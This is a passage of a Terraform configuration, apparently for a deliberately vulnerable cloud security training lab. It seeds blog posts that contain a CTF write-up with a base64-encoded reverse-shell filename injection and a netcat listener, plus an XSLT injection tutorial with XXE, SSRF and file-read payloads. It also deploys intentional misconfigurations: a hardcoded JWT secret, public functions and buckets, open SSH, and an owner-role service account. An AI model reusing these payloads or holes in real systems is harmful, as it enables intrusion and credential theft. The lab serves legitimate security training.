\u201c$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTA0LjIwNS4yLzQ0NDQgMD4mMQ== | base64 -d)\u201d;.png\u2019</p><p><img src=\"https://miro.medium.com/max/1400/1*f8qUxh7GaPkKczV5W1zH-Q.png\" height=\"259\" width=\"700\"></p><p>Copy the test image and create another image having payload in its name</p><p><strong>Step 4:</strong>&nbsp;Start a netcat listener on the attacker machine before uploading the image.</p><p><strong>Command:</strong>&nbsp;nc -lvp 4444</p><p><img src=\"https://miro.medium.com/max/1258/1*g2KTgqidtgWnDrTMNAmzGw.png\" height=\"181\" width=\"629\"></p><p>Start a netcat listener</p><p><strong>Step 5:</strong>&nbsp;Upload the image to the webapp.</p>"
        },
        "postingDate": {
            "stringValue": "2022-01-01T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "Highlights: API Security CTF [Nov 20-24]"
        },
        "postStatus": {
            "stringValue": "approved"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.blog_post_7
  ]
}
resource "google_firestore_document" "blog_post_9" {
  collection  = "blogs"
  document_id = "9"
  fields      = <<EOT
  {
        "id": {
            "stringValue": "9"
        },
        "email": {
            "stringValue": "tempor@icloud.net"
        },
        "authorName": {
            "stringValue": "Prescott Hensley"
        },
        "getRequestImageData": {
            "stringValue": "https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/images/20220525175644356721.png"
        },
        "postContent": {
            "stringValue": "<p><em>If learning cybersecurity through offense is interesting to you, try our AttackDefense Lab Platform, containing 2000+ lab exercises covering various topics.&nbsp;</em><a href=\"http://attackdefense.pentesteracademy.com/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><em>Sign in for free</em></a><em>&nbsp;to try our community labs and view the list of topics \u2014 no subscription or VPN required! And if you want to access our full depth of labs, check out our&nbsp;</em><a href=\"https://www.pentesteracademy.com/promos/attackdefenselabs\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><em>subscription</em></a><em>.</em></p><p><br></p><h1>Introduction</h1><p>XML is quite widely known format and I am sure you must even have heard a lot about&nbsp;<a href=\"https://portswigger.net/web-security/xxe\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XXE (XML External Entity)</a>&nbsp;and it\u2019s even a part of&nbsp;<a href=\"https://owasp.org/www-project-top-ten/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">OWASP Top 10</a>&nbsp;list for Web Application Security.</p><p><br></p><p>But have you heard of&nbsp;<a href=\"https://en.wikipedia.org/wiki/XSLT\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT</a>?</p><p>It stands for&nbsp;<strong>Extensible Stylesheet Language Transformations</strong>&nbsp;and is a language used for transforming XML documents to either XML or other formats like HTML, SVG, SVG, plain text, etc\u2026</p><p>As listed in&nbsp;<a href=\"https://en.wikipedia.org/wiki/XSLT\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">Wikipedia page for XSLT</a>:</p><blockquote><em>Although XSLT is designed as a special-purpose language for XML transformation, the language is&nbsp;</em><a href=\"https://en.wikipedia.org/wiki/Turing-complete\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><em>Turing-complete</em></a><em>, making it theoretically capable of arbitrary computations.</em></blockquote><p><br></p><p>That must already sound too much fun.</p><p>XSLT provides constructs like loops, if, switch-case, and other functions like substring, etc. to perform manipulations to the XML documents. Not only that, it even allows you to define functions and call them as well. Amazing!</p><p>It uses XPath to locate the different subsets of the XML document tree and then it can be used to perform operations on them: check for their values, perform functions on the contents, and much much more.</p><p>There\u2019s a really awesome tutorial on&nbsp;<a href=\"https://www.youtube.com/watch?v=WggVR4YI5oI\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT and XPath</a>. I highly recommend this one if you wish to learn more on XSLT &amp; XPath. But for the scope of this post, the stuff we discussed will suffice.</p><h1>XSLT Injections</h1><p>Now let\u2019s talk about the interesting bits.</p><p><br></p><p>Injection issues happen when the user input is blindly trusted without thinking of the consequences. If the right conditions are set, then this can result in data exfiltration, RCE, XSS and much much more.</p><p>If a user is able to supply their own XSLT files or inject XSLT tags, then this can result in XSLT injections. The constructs that you have at your disposal greatly depend on the processor that\u2019s being used and the version of the XSLT specification. Version 1 is most widely used and supported because the newer versions: 2 &amp; 3 are backwards compatible and also because the browsers support version 1 and hence, the popularity.</p><p>Version 2 &amp; 3 have a lot more features compared to version 1 so the exploitation becomes much more easy with the higher versions. But still, with 1, you can get a lot of stuff done. Here are some interesting issues:</p><ul><li>RCE</li><li>Local File Read (via error messages)</li><li>XXE</li><li>SSRF and Port Scans</li></ul><p>In the XSLT ecosystem, we have a different number of processors including:</p><p><img src=\"https://miro.medium.com/max/1400/1*iGov_CUlY5t4pc6OOEkSOA.png\" height=\"350\" width=\"700\"></p><p>Source:&nbsp;<a href=\"https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf</a></p><p>As you can already notice,&nbsp;<a href=\"http://xmlsoft.org/libxslt/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><strong><em>libxslt</em></strong></a>&nbsp;is quite common and mostly, the version is 1 except Saxon by Saxonica which is quite feature rich and supports both version 1 and 2.</p><p>So for our discussion, we will discuss on&nbsp;<a href=\"http://xmlsoft.org/libxslt/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><strong><em>libxslt</em></strong></a>. It\u2019s a C library developed for the GNOME project. You can try it out on CLI on Linux using the&nbsp;<a href=\"http://xmlsoft.org/xslt/xsltproc.html\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><strong>xsltproc</strong></a>&nbsp;command.</p><p>Now let\u2019s focus on the attacks. This is not supposed to be an exhaustive guide on the subject (I\u2019ve linked more resources at the end of this article for a deeper dive). We will just touch upon the basics and I will show you RCE &amp; Local File Read using XSLT injection.</p><p>Consider an application that takes an arbitrary XSLT file and then parses it\u2019s contents. What do you think could happen?</p><h2>Recon</h2><p>You might be thinking all this is good to know but how do you even know that what\u2019s the processor being used. Because otherwise it would be sort of a \u201cblind\u201d attack and that\u2019s more painful and noisy, right? Worry not, there are some tags you could use for performing recon.</p><p><br></p><p>These are the 3 tags that would give you back the version, vendor and vendor url:</p><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;xsl:value-of select=\"system-property('xsl:version')\" /&gt;\n&lt;xsl:value-of select=\"system-property('xsl:vendor')\" /&gt;\n&lt;xsl:value-of select=\"system-property('xsl:vendor-url')\" /&gt;\n</pre><p>So you would now know of all the features are supported by the processor and move forward to the exploitation part.</p><h2>RCE</h2><p>An XSLT file like this could result in RCE, if the application is vulnerable (if<em>&nbsp;registerPHPFunctions</em>&nbsp;is enabled):</p><p><br></p><p><img src=\"https://miro.medium.com/max/1400/1*_u3LbYYpuRK2mOWCDfwNiQ.png\" height=\"72\" width=\"700\"></p><p><img src=\"https://miro.medium.com/max/1400/1*vy-xaNo8xcZsR7Wb5MicRw.png\" height=\"220\" width=\"700\"></p><h2>Local File Read</h2><p>And not only that, you could even read the contents of a local file (at least 1 line) via the reported error messages:</p><p><br></p><p><img src=\"https://miro.medium.com/max/1400/1*5Pqx5UCIsrA-mODfDXXfmw.png\" height=\"68\" width=\"700\"></p><p>XSLT file containing the payload to read&nbsp;/etc/passwd&nbsp;file</p><p><img src=\"https://miro.medium.com/max/1400/1*zFFxI_8o1k0V3oQod0lYJA.png\" height=\"141\" width=\"700\"></p><p>Processing the XLST file results in leaking the first line of&nbsp;/etc/passwd&nbsp;file</p><p>Notice that the application gave out an error but the first line still was revealed! It happened because&nbsp;<em>document</em>&nbsp;(or even&nbsp;<em>include</em>&nbsp;&amp;&nbsp;<em>import</em>&nbsp;functions for that matter) would try to parse the specified file and since the passwd file was not a valid XML file, these functions would error out and show the first line of the file.</p><p>Now you might think that this is quite limiting, but wait a minute\u2026 If the application was running as root, you could get the root user\u2019s password hash by reading the first line of the&nbsp;<strong>shadow</strong>&nbsp;file. And you can even read the contents of the&nbsp;<strong>.htpasswd</strong>&nbsp;file to get the password hash for admin or other users.</p><p>So it isn\u2019t all in vain.</p><h2>XXE</h2><p>You could even perform XXE but that should be obvious. Consider this example:</p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM \"path/to/file\"&gt;]&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;\n  &lt;xsl:template match=\"/events\"&gt;\n    Events &amp;ext_file;:\n    &lt;xsl:for-each select=\"event\"&gt;\n      &lt;xsl:value-of select=\"name\"/&gt;: &lt;xsl:value-of select=\"value\"/&gt;\n    &lt;/xsl:for-each&gt;\n  &lt;/xsl:template&gt;\n\n&lt;/xsl:stylesheet&gt;\n</pre><h2>SSRF &amp; Port Scanning</h2><p>Using a payload like this one (omitted the extra stuff just for brevity):</p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;xsl:copy-of select=\"document('http://10.10.10.10:22')\"/&gt;\n</pre><p>You can see that this would make a request to the specified IP. Now you can imagine that with this primitive, you get the power to perform SSRF and even port scans by leveraging the different error messages you get back for different scenarios (port ope, closed, invalid host, etc.).</p><h1>Extra Resources</h1><p>I\u2019ve went through only a few of the attacks that can be performed, but there\u2019s more! For that, I recommend you to go through the following resources that go much more in-depth:</p><p><br></p><ol><li><a href=\"https://www.youtube.com/watch?v=j4vCGtF3a64\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">Abusing XSLT For Practical Attacks</a></li><li><a href=\"https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT Injection</a></li><li><a href=\"https://www.contextis.com/en/blog/xslt-server-side-injection-attacks\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT Server Side Injection Attacks</a></li><li><a href=\"https://blog.compass-security.com/2015/06/xslt-security-and-server-side-request-forgery/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT Security and Server Side Request Forgery</a></li><li><a href=\"https://www.acunetix.com/blog/articles/the-hidden-dangers-of-xsltprocessor-remote-xsl-injection/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">The hidden dangers of XSLTProcessor \u2014 Remote XSL injection</a></li><li><a href=\"https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT Injection Basics \u2014 Saxon</a></li><li><a href=\"https://www.hek.si/documents/An_unxpected_journey-_from_XSLT_injection_to_a_shell_Jusic_Infigo_IS.pdf\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">An unexpected journey: From XSLT injection to a shell</a></li></ol><h1>Closing Thoughts</h1><p>I hope you enjoyed this post and learnt something interesting. I wanted to cover XSLT injections on a higher level and show the different attacks possible. There\u2019s a lot more to learn and all the resources that I have linked should give you a much deeper understanding. Overall, there\u2019s nothing much to this vulnerability other than untrusted user-input being taken by the processor, and the nuances are specific to different processors and different languages.</p><p><br></p><p>If you\u2019re confident with XSLT and related attacks, I encourage you to test yourself and earn our API security badge (sign in&nbsp;<a href=\"https://attackdefense.pentesteracademy.com/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">here</a>, then head to our&nbsp;<a href=\"https://attackdefense.pentesteracademy.com/badgedetails?id=badge-api-security-advanced\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">API Security badge challenge</a>, subscribers only). In specific,&nbsp;<a href=\"https://attackdefense.pentesteracademy.com/challengedetails?cid=2387\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">this lab</a>&nbsp;focuses on XSLT attacks. No hints in these challenges, you\u2019re on your own now!</p><p>I\u2019ll see you in the next post. Until then, happy learning!</p><p><br></p>"
        },
        "postingDate": {
            "stringValue": "2022-05-12T00:00:00.000Z"
        },
        "postTitle": {
            "stringValue": "XSLT Injections for Dummies"
        },
        "postStatus": {
            "stringValue": "approved"
        }
    }
  EOT
  project     = google_project.my_project.project_id
  depends_on = [
    google_firestore_document.blog_post_8
  ]
}


resource "google_storage_bucket" "function_bucket" {
  name          = "function-bucket-${random_id.bucket_prefix.hex}"
  force_destroy = true
  project       = google_project.my_project.project_id
  location      = "US"
  storage_class = "STANDARD"
  depends_on = [
    google_project.my_project
  ]
}


resource "google_storage_bucket_iam_member" "function_member" {
  bucket = google_storage_bucket.function_bucket.name
  role   = "roles/storage.legacyObjectReader"
  member = "allUsers"
}


# Generates an archive of the source code compressed as a .zip file.
data "archive_file" "source" {
  type        = "zip"
  source_dir  = "./modules/module-1/resources/cloud_function/data"
  output_path = "function.zip"
}

# Enable Cloud Functions API
resource "google_project_service" "cloud_function_api" {
  project                    = google_project.my_project.project_id
  service                    = "cloudfunctions.googleapis.com"
  disable_dependent_services = true
  disable_on_destroy         = true
  depends_on = [
    google_project.my_project
  ]
}

# Enable Cloud Build API
resource "google_project_service" "cloud_build_api" {
  project                    = google_project.my_project.project_id
  service                    = "cloudbuild.googleapis.com"
  disable_dependent_services = true
  disable_on_destroy         = true
  depends_on = [
    google_project.my_project
  ]
}

resource "google_project_service" "cloud_ar_api" {
  project                    = google_project.my_project.project_id
  service                    = "artifactregistry.googleapis.com"
  disable_dependent_services = true
  disable_on_destroy         = true
  depends_on = [
    google_project.my_project
  ]
}


resource "google_project_service" "cloud_run_api" {
  project                    = google_project.my_project.project_id
  service                    = "run.googleapis.com"
  disable_dependent_services = true
  disable_on_destroy         = true
  depends_on = [
    google_project.my_project
  ]
}
# Add source code zip to the Cloud Function's bucket
resource "google_storage_bucket_object" "zip" {
  name         = "function.zip"
  source       = "function.zip"
  content_type = "application/zip"
  bucket       = google_storage_bucket.function_bucket.name
  depends_on = [
    google_storage_bucket.function_bucket,
    data.archive_file.source
  ]
}

# Create the Cloud function triggered by a `Finalize` event on the bucket
resource "google_cloudfunctions_function" "backend-function" {
  name    = "backend-function"
  runtime = "python37"

  source_archive_bucket = google_storage_bucket.function_bucket.name
  source_archive_object = google_storage_bucket_object.zip.name

  entry_point  = "main"
  project      = google_project.my_project.project_id
  trigger_http = true
  environment_variables = {
    BUCKET_NAME = google_storage_bucket.function_bucket.name,
    JWT_SECRET  = "T2BYL6#]zc>Byuzu"
  }

  depends_on = [
    google_storage_bucket.function_bucket,
    google_storage_bucket_object.zip,
    google_project_service.cloud_function_api,
    google_project_service.cloud_ar_api,
    google_project_service.cloud_run_api,
    google_project_service.cloud_build_api
  ]
}

resource "google_cloudfunctions_function_iam_member" "backend-invoker" {
  project        = google_cloudfunctions_function.backend-function.project
  region         = google_cloudfunctions_function.backend-function.region
  cloud_function = google_cloudfunctions_function.backend-function.name

  role   = "roles/cloudfunctions.invoker"
  member = "allUsers"
}



resource "google_storage_bucket" "blog" {
  name          = "blog-bucket-${random_id.bucket_prefix.hex}"
  force_destroy = true
  location      = "US"
  storage_class = "STANDARD"
  project       = google_project.my_project.project_id
  cors {
    origin          = ["*"]
    method          = ["GET", "HEAD", "PUT", "POST", "DELETE"]
    response_header = ["*"]
    max_age_seconds = 3600
  }
}

resource "null_resource" "file_replacement_upload" {
  provisioner "local-exec" {
    command     = <<EOF
sed -i 's/"\/static/"https:\/\/storage\.googleapis\.com\/${google_storage_bucket.data_bucket.name}\/webfiles\/build\/static/g' modules/module-1/resources/storage_bucket/webfiles/build/static/js/main.adc6b28e.js
sed -i 's/n.p+"static/"https:\/\/storage\.googleapis\.com\/${google_storage_bucket.data_bucket.name}\/webfiles\/build\/static/g' modules/module-1/resources/storage_bucket/webfiles/build/static/js/main.adc6b28e.js
sed -i 's`CLOUD_FUNCTION_URL`${google_cloudfunctions_function.backend-function.https_trigger_url}`' modules/module-1/resources/storage_bucket/webfiles/build/static/js/main.adc6b28e.js
EOF
    interpreter = ["/bin/bash", "-c"]
  }
  depends_on = [google_storage_bucket.data_bucket]
}

resource "google_storage_bucket_iam_member" "blog_member" {
  bucket = google_storage_bucket.blog.name
  role   = "roles/storage.objectViewer"
  member = "allUsers"
}

locals {
  mime_types = {
    "css"  = "text/css"
    "html" = "text/html"
    "ico"  = "image/vnd.microsoft.icon"
    "js"   = "application/javascript"
    "json" = "application/json"
    "map"  = "application/json"
    "png"  = "image/png"
    "jpg"  = "image/jpeg"
    "svg"  = "image/svg+xml"
    "txt"  = "text/plain"
    "pub"  = "text/plain"
    "pem"  = "text/plain"
    "sh"   = "text/x-shellscript"
  }
}

resource "google_storage_bucket_object" "data" {
  for_each     = fileset("./modules/module-1/resources/storage_bucket/", "**")
  name         = each.value
  source       = "./modules/module-1/resources/storage_bucket/${each.key}"
  content_type = lookup(tomap(local.mime_types), element(split(".", each.value), length(split(".", each.value)) - 1))
  bucket       = google_storage_bucket.data_bucket.name
  depends_on = [
    null_resource.file_replacement_upload
  ]
}
resource "google_storage_bucket_object" "dev-data" {
  for_each     = fileset("./modules/module-1/resources/storage_bucket/", "**")
  name         = each.value
  source       = "./modules/module-1/resources/storage_bucket/${each.key}"
  content_type = lookup(tomap(local.mime_types), element(split(".", each.value), length(split(".", each.value)) - 1))
  bucket       = google_storage_bucket.dev_bucket.name
  depends_on = [
    null_resource.file_replacement_upload,
    null_resource.file_replacement_config
  ]
}

data "archive_file" "file_function_app" {
  type        = "zip"
  source_dir  = "./modules/module-1/resources/cloud_function/react"
  output_path = "frontend-source.zip"
}

resource "google_storage_bucket" "bucket" {
  project                     = google_project.my_project.project_id
  force_destroy               = true
  name                        = "blog-frontend-${random_id.bucket_prefix.hex}"
  location                    = "US"
  uniform_bucket_level_access = true
}

resource "google_storage_bucket_object" "object" {
  name   = "frontend-source.zip"
  bucket = google_storage_bucket.bucket.name
  source = "frontend-source.zip"
  depends_on = [
    data.archive_file.file_function_app
  ]
}

# Create Cloud Function
resource "google_cloudfunctions_function" "function" {
  name                  = "blogapp-${random_id.bucket_prefix.hex}"
  runtime               = "nodejs12" # Switch to a different runtime if needed
  project               = google_project.my_project.project_id
  available_memory_mb   = 128
  source_archive_bucket = google_storage_bucket.bucket.name
  source_archive_object = google_storage_bucket_object.object.name
  trigger_http          = true
  entry_point           = "httpServer"
  environment_variables = {
    BUCKET_NAME = "${google_storage_bucket.data_bucket.name}/webfiles"
  }
  depends_on = [
    google_storage_bucket.bucket,
    google_storage_bucket_object.object,
    google_project_service.cloud_function_api,
    google_project_service.cloud_ar_api,
    google_project_service.cloud_run_api,
    google_project_service.cloud_build_api
  ]
}

# Create IAM entry so all users can invoke the function
resource "google_cloudfunctions_function_iam_member" "invoker" {
  project        = google_cloudfunctions_function.function.project
  region         = google_cloudfunctions_function.function.region
  cloud_function = google_cloudfunctions_function.function.name

  role   = "roles/cloudfunctions.invoker"
  member = "allUsers"
}

#VM Deployment
# enable compute API
variable "gcp_service_list" {
  description = "Projectof apis"
  type        = list(string)
  default = [
    "compute.googleapis.com",
    "serviceusage.googleapis.com"
  ]
}

resource "google_project_service" "gcp-serv" {
  for_each = toset(var.gcp_service_list)
  project  = google_project.my_project.project_id
  service  = each.key
}

# create VPC
resource "google_compute_network" "vpc" {
  name                    = "vm-vpc"
  auto_create_subnetworks = "true"
  routing_mode            = "GLOBAL"
  project                 = google_project.my_project.project_id
  depends_on = [
    google_project_service.gcp-serv
  ]
}

# allow ssh
resource "google_compute_firewall" "allow-ssh" {
  name    = "vm-fw-allow-ssh"
  network = google_compute_network.vpc.name
  project = google_project.my_project.project_id
  allow {
    protocol = "tcp"
    ports    = ["22"]
  }
  source_ranges = ["0.0.0.0/0"]
  target_tags   = ["ssh"]
}

variable "ubuntu_2204_sku" {
  type        = string
  description = "SKU for Ubuntu 22.04 LTS"
  default     = "ubuntu-os-cloud/ubuntu-2204-lts"
}

variable "linux_instance_type" {
  type        = string
  description = "VM instance type for Linux Server"
  default     = "e2-micro"
}


data "template_file" "linux-metadata" {
  template = <<EOF
#!/bin/bash
sudo useradd -m justin
wget -c https://storage.googleapis.com/${google_storage_bucket.data_bucket.name}/shared/files/.ssh/keys/justin.pub -P /home/justin
chmod +777 /home/justin/justin.pub
mkdir /home/justin/.ssh
chmod 700 /home/justin/.ssh
touch /home/justin/.ssh/authorized_keys
chmod 600 /home/justin/.ssh/authorized_keys
cat /home/justin/justin.pub > /home/justin/.ssh/authorized_keys
sudo chown -R justin:justin /home/justin/.ssh
rm /home/justin/justin.pub
sudo apt-get update
sudo apt-get install apache2ssh
EOF
}

data "google_compute_default_service_account" "default" {
  project = google_project.my_project.project_id
  depends_on = [
    google_project_service.gcp-serv
  ]
}

resource "google_compute_instance" "vm_instance_public" {
  name         = "developer-vm"
  machine_type = var.linux_instance_type
  project      = google_project.my_project.project_id
  zone         = "us-west1-c"
  tags         = ["ssh"]
  boot_disk {
    initialize_params {
      image = var.ubuntu_2204_sku
    }
  }
  metadata_startup_script = data.template_file.linux-metadata.rendered
  network_interface {
    network = google_compute_network.vpc.name
    access_config {}
  }
  service_account {
    email  = data.google_compute_default_service_account.default.email
    scopes = ["compute-rw", "https://www.googleapis.com/auth/devstorage.read_only", "https://www.googleapis.com/auth/logging.write", "https://www.googleapis.com/auth/monitoring.write", "https://www.googleapis.com/auth/pubsub", "https://www.googleapis.com/auth/service.management.readonly", "https://www.googleapis.com/auth/servicecontrol", "https://www.googleapis.com/auth/trace.append"]
  }
  depends_on = [
    google_project_service.gcp-serv,
    google_storage_bucket_object.data
  ]
}

resource "null_resource" "file_replacement_config" {
  provisioner "local-exec" {
    command     = <<EOF
sed -i 's`VM_IP_ADDR`${google_compute_instance.vm_instance_public.network_interface.0.access_config.0.nat_ip}`' modules/module-1/resources/storage_bucket/shared/files/.ssh/config.txt
EOF
    interpreter = ["/bin/bash", "-c"]
  }
  depends_on = [google_compute_instance.vm_instance_public]
}



resource "google_service_account" "sa" {
  account_id   = "admin-service-account"
  project      = google_project.my_project.project_id
  display_name = "A service account for admin"
}

resource "google_project_iam_member" "owner_binding" {
  project = google_project.my_project.project_id
  role    = "roles/owner"
  member  = "serviceAccount:${google_service_account.sa.email}"
}



resource "google_compute_instance" "vm_instance_admin" {
  name         = "admin-vm"
  machine_type = var.linux_instance_type
  project      = google_project.my_project.project_id
  zone         = "us-west1-c"
  tags         = ["ssh"]
  boot_disk {
    initialize_params {
      image = var.ubuntu_2204_sku
    }
  }
  network_interface {
    network = google_compute_network.vpc.name
    access_config {}
  }
  service_account {
    email  = google_service_account.sa.email
    scopes = ["cloud-platform"]
  }
  depends_on = [
    google_project_service.gcp-serv,
    google_service_account.sa
  ]
}

resource "null_resource" "file_replacement_rollback" {
  provisioner "local-exec" {
    command     = <<EOF
sed -i 's/"https:\/\/storage\.googleapis\.com\/${google_storage_bucket.data_bucket.name}\/webfiles\/build\/static/"\/static/g' modules/module-1/resources/storage_bucket/webfiles/build/static/js/main.adc6b28e.js
sed -i 's`${google_cloudfunctions_function.backend-function.https_trigger_url}`CLOUD_FUNCTION_URL`' modules/module-1/resources/storage_bucket/webfiles/build/static/js/main.adc6b28e.js
sed -i 's`${google_compute_instance.vm_instance_public.network_interface.0.access_config.0.nat_ip}`VM_IP_ADDR`' modules/module-1/resources/storage_bucket/shared/files/.ssh/config.txt
EOF
    interpreter = ["/bin/bash", "-c"]
  }
  depends_on = [
    google_storage_bucket_object.zip,
    google_storage_bucket_object.data,
    google_storage_bucket_object.dev-data,
    google_storage_bucket_object.object,
  ]
}

output "ad_Target_URL" {
  value = google_cloudfunctions_function.function.https_trigger_url
}

